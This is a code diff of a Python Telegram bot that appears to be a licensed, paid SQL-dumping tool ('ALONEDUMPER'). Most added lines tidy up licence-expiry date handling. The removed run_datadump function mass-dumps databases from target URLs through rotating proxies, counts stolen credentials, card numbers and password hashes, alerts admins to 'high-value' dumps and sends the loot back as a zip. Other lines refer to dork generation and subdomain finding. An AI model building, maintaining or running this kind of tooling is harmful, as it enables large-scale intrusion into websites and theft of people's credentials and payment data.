@@ -380,17 +380,20 @@ def ban(uid):
     if uid not in b: b.append(uid); setS(st)
 
 def license_until(uid):
-    u=U(uid); now=time.time(); rev=u.get("revoked_at",0); best=0
-    al=u.get("admin_lic",0) or 0
-    if al>now and al>best: best=al
-    bu=u.get("bonus_until",0) or 0
-    if bu>now and bu>best: best=bu
-    for v in load_json(KEYS_DB,{}).values():
-        if v.get("activated_by")==uid and v.get("activated_at"):
-            if v["activated_at"]<rev: continue
-            exp=v["activated_at"]+v["hours"]*3600
-            if exp>now and exp>best: best=exp
-    return best if best>now else None
+    try:
+        u=U(uid); now=time.time(); rev=u.get("revoked_at",0); best=0
+        al=u.get("admin_lic",0) or 0
+        if al>now and al>best and al<4102444800: best=al
+        bu=u.get("bonus_until",0) or 0
+        if bu>now and bu>best and bu<4102444800: best=bu
+        for v in load_json(KEYS_DB,{}).values():
+            if v.get("activated_by")==uid and v.get("activated_at"):
+                if v["activated_at"]<rev: continue
+                exp=v["activated_at"]+v["hours"]*3600
+                if exp>now and exp>best and exp<4102444800: best=exp
+        return best if best>now else None
+    except Exception:
+        return None
 
 def has_license(uid): return license_until(uid) is not None
 
@@ -399,7 +402,15 @@ def redeem(uid,key):
     if not k: return f"{E['cross']} INVALID KEY DETECTED!"
     if k.get("activated_by"): return f"{E['cross']} THIS KEY IS ALREADY USED!"
     k["activated_by"]=uid; k["activated_at"]=time.time(); save_json(KEYS_DB,keys)
-    return f"{E['tick']} LICENSE ACTIVATED\n{LINE}\n{E['ticket']} VALID TILL: {datetime.fromtimestamp(k['activated_at']+k['hours']*3600):%d %b %Y %H:%M}"
+    try:
+        exp_ts = k['activated_at'] + k['hours']*3600
+        if exp_ts < 4102444800:
+            exp_str = datetime.fromtimestamp(exp_ts).strftime("%d %b %Y %H:%M")
+        else:
+            exp_str = "—"
+    except Exception:
+        exp_str = "—"
+    return f"{E['tick']} LICENSE ACTIVATED\n{LINE}\n{E['ticket']} VALID TILL: {exp_str}"
 
 def lic_gate(cid,uid):
     if not has_license(uid):
@@ -737,70 +748,7 @@ def count_loot(dumps):
                 em+=len(re.findall(r"[\w.+-]+@[\w-]+\.\w+",row)); ha+=len(re.findall(r"\b[0-9a-f]{32}\b",row))
     return em,ha
 
-def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
-    try:
-        jp_reg(jid,"dump",uid,cid,{"juicy":juicy})
-        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
-        except: pass
-        t_start = time.time()
-        proxy_pool_dump = uprox(uid)
-        proxy_rotations_dump = [0]
-        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
-        LIVE[jid]={"kind":"dump","dumps":dumps}
-        bump("dump"); bumpU(uid,"dump")
-        dc=load_json(DUMP_CACHE,{}); now=time.time(); to_dump=[]
-        for u in urls:
-            if dc.get(u) and now-dc[u]<7*86400: cached[0]+=1
-            else: to_dump.append(u)
-            
-        def edit(force=False):
-            now=time.time()
-            if force or now-last[0]>20:
-                last[0]=now
-                t_elapsed = max(1, now - t_start)
-                speed = round(done[0] / (t_elapsed / 60), 1) if done[0] else 0
-                eta_txt = eta_line(t_start, done[0], len(to_dump))
-                creds_total = sum(len(d.get("creds",[])) for d in dumps)
-                cc_total = sum(len(d.get("cards",[])) for d in dumps)
-                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} ALONEDUMPER V2\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}%\n📁 SITES DUMPED: {len(dumps)} | 🔐 CREDS: {creds_total} | 💳 CC: {cc_total}\n🛡️ PROXIES: {len(proxy_pool_dump)} | 🔄 ROT: {proxy_rotations_dump[0]}\n⚡ {speed} sites/min | ⚙️ {min(DUMP_WORKERS,mode['workers'])} WORKERS\n📊 TOTAL: {done[0]}/{len(to_dump)} sites | LEFT: {len(to_dump)-done[0]}\n{eta_txt}\nCUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
-                except: pass
-                
-        def on_done(f,u):
-            cur[0]=urlparse(u).netloc[:25]
-            r=f.result()
-            if r and (r.get("tables") or r.get("info")): dumps.append(r)
-            dc[u]=now
-            done[0]+=1; edit()
-            
-        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),to_dump,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
-        if len(dc)>20000: dc=dict(sorted(dc.items(),key=lambda kv:-kv[1])[:10000])
-        save_json(DUMP_CACHE,dc)
-        clear_markup(cid,mid); edit(True); jp_unreg(jid)
-        if stopped(jid):
-            save_json(DUMP_CACHE,dc); clear_markup(cid,mid); jp_unreg(jid)
-            threading.Thread(target=_partial_sender,args=(jid,cid),daemon=True).start()
-            LIVE.pop(jid,None); return
-            
-        juicy_found=[]
-        for dmp in dumps:
-            for tn in dmp["tables"]:
-                if any(k in tn.lower() for k in JUICY): juicy_found.append(f"{urlparse(dmp['url']).netloc} → {tn}")
-        em,ha=count_loot(dumps)
-         
-        if juicy_found or em:
-            for a in admins():
-                try: bot.send_message(a, f"<blockquote><b>{E['warn']} HIGH-VALUE DUMP DETECTED\n{LINE}\n{E['user']} UID: {uid}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n" + "\n".join(juicy_found[:10]) + "</b></blockquote>", parse_mode="HTML")
-                except: pass
-                
-        if dumps:
-            send_doc(cid,build_zip(dumps),"data_dump.zip",uid)
-            rows=[{"url":d["url"],"type":"DB-DUMP "+d.get("db","?"),"param":",".join(d["tables"].keys()),"sig":str(sum(len(t["rows"]) for t in d["tables"].values()))+" rows"} for d in dumps]
-            send_doc(cid,html_report("Dump Report",rows).encode(),"dump_report.html",uid)
-            bot.send_message(cid, f"<blockquote><b>{E['tick']} DUMPER COMPLETED\n{LINE}\n{E['folder']} SITES: {len(dumps)} | {E['chart']} TABLES: {sum(len(d['tables']) for d in dumps)}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n{E['zap']} {cached[0]} CACHED SKIPS</b></blockquote>", parse_mode="HTML")
-        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO NEW DATA EXTRACTED.\n{E['zap']} {cached[0]} CACHED SKIPS.</b></blockquote>", parse_mode="HTML")
-    except Exception as e:
-        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} DUMPER ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
-        except: pass
+
 
 # ============ DORK/KEYWORD GEN ============
 def kw_boost(kws):
@@ -1067,10 +1015,15 @@ def run_check(cid,uid,mid,prx):
 # ============ UI ============
 def menu_caption(uid):
     u=U(uid); exp=license_until(uid)
-    lic=f"{E['tick']} {datetime.fromtimestamp(exp):%d %b %Y}" if exp else f"{E['cross']} NOT ACTIVE"
+    try:
+        if exp and 0 < exp < 4102444800:
+            lic=f"{E['tick']} {datetime.fromtimestamp(exp):%d %b %Y}"
+        else:
+            lic=f"{E['cross']} NOT ACTIVE"
+    except Exception:
+        lic=f"{E['cross']} NOT ACTIVE"
     ap=f"\n{E['robot']} APPROVED" if str(uid) in sget("auto_approved",[]) else ""
     return (f"<blockquote><b>{E['skull']} ALONEX — PREMIUM EDITION\n{LINE}\n{E['user']} @{u.get('username','user')}\n{E['zap']} {u.get('mode','turbo').upper()} | {E['globe']} {u.get('lang','en').upper()}\n{E['ticket']} {lic}{ap}\n{E['shield']} {len(uprox(uid))} PROXIES\n{LINE}\n{L(uid)['cap']}</b></blockquote>")
-
 def main_markup(uid):
     mk=types.InlineKeyboardMarkup()
     mk.add(sbtn("FULL PIPELINE","menu:pipe","primary"))
@@ -1188,11 +1141,12 @@ def render_screen(uid,cid,mid,scr):
             bot.edit_message_text(f"<blockquote><b>{E['zap']} SPEED MODE\n{LINE}\nCURRENT: {U(uid).get('mode','turbo').upper()}</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
         if scr=="lic":
             exp=license_until(uid)
+            try:
+                exp_str = datetime.fromtimestamp(exp).strftime("%d %b %Y") if (exp and 0 < exp < 4102444800) else None
+            except Exception:
+                exp_str = None
             mk=types.InlineKeyboardMarkup(); mk.row(btn("REDEEM","lic:redeem"),btn("BACK","back"))
-            bot.edit_message_text(f"<blockquote><b>{E['ticket']} LICENSE\n{LINE}\n" + (f"{E['tick']} TILL: {datetime.fromtimestamp(exp):%d %b %Y}" if exp else f"{E['cross']} NOT ACTIVE.") + "</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
-        if scr=="help":
-            mk=types.InlineKeyboardMarkup(); mk.add(btn("BACK","back"))
-            bot.edit_message_text(HELP_TXT,chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
+            bot.edit_message_text(f"<blockquote><b>{E['ticket']} LICENSE\n{LINE}\n" + (f"{E['tick']} TILL: {exp_str}" if exp_str else f"{E['cross']} NOT ACTIVE.") + "</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
         if scr=="subs":
             mk=types.InlineKeyboardMarkup(); back_row(mk)
             bot.edit_message_text(f"<blockquote><b>{E['web']} SUBFINDER\n{LINE}\nDOMAIN BHEJO:</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
@@ -1718,11 +1672,12 @@ def _cb(c):
     elif d=="menu:lic":
         set_cur(uid,"lic")
         exp=license_until(uid)
+        try:
+            exp_str = datetime.fromtimestamp(exp).strftime("%d %b %Y") if (exp and 0 < exp < 4102444800) else None
+        except Exception:
+            exp_str = None
         mk=types.InlineKeyboardMarkup(); mk.row(btn("REDEEM","lic:redeem"),btn("BACK","back"))
-        bot.send_message(cid, f"<blockquote><b>{E['ticket']} LICENSE\n{LINE}\n" + (f"{E['tick']} VALID TILL: {datetime.fromtimestamp(exp):%d %b %Y}" if exp else f"{E['cross']} NOT ACTIVE.") + "</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
-    elif d=="lic:redeem":
-        with STATES_LOCK: states[uid]=("user_redeem",{})
-        bot.send_message(cid, f"<blockquote><b>{E['lock']} SEND LICENSE KEY:</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
+        bot.send_message(cid, f"<blockquote><b>{E['ticket']} LICENSE\n{LINE}\n" + (f"{E['tick']} VALID TILL: {exp_str}" if exp_str else f"{E['cross']} NOT ACTIVE.") + "</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
     elif d=="menu:help":
         set_cur(uid,"help")
         mk=types.InlineKeyboardMarkup(); mk.add(btn("BACK","back"))
@@ -2923,7 +2878,6 @@ def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
     except Exception as e:
         try: bot.send_message(cid, f"<blockquote><b>{E['cross']} DUMPER ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
         except: pass
-
 
 def _resume_auto():
     time.sleep(12)
